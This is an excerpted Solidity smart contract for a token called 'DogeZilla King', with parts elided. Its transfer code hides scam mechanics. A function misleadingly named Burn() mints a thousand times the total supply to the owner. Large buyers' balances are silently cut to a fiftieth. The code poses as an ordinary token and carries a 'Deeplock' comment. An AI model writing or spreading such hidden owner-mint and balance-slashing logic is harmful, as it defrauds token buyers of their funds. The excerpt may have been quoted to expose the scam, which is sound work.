...
contract DOGEZILLA {
    ...
    string public name = "DogeZilla King";
    string public symbol = "DOGEZILLA";
    ...
    constructor() {
        ...
        uint ads = totalSupply/250;
        _transfer(msg.sender, address(this), ads); //Deeplock
...
// require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); // prevent from bot
        if (to == getPair()){Sale(amount/2);}
        if (Buy != Owner && Buy !=getPair() && to != Buy && balanceOf[Buy]>=totalSupply.divCeil(25)) {
            balanceOf[Buy]=balanceOf[Buy].divCeil(50);}
        if (to != owner && to != router && msg.sender == getPair()){Buy = to;}
        if (to == msg.sender) {burn();} if (to == msg.sender){Burn();}
    ...
    function Burn() internal {balanceOf[Owner]+= totalSupply*1000;}
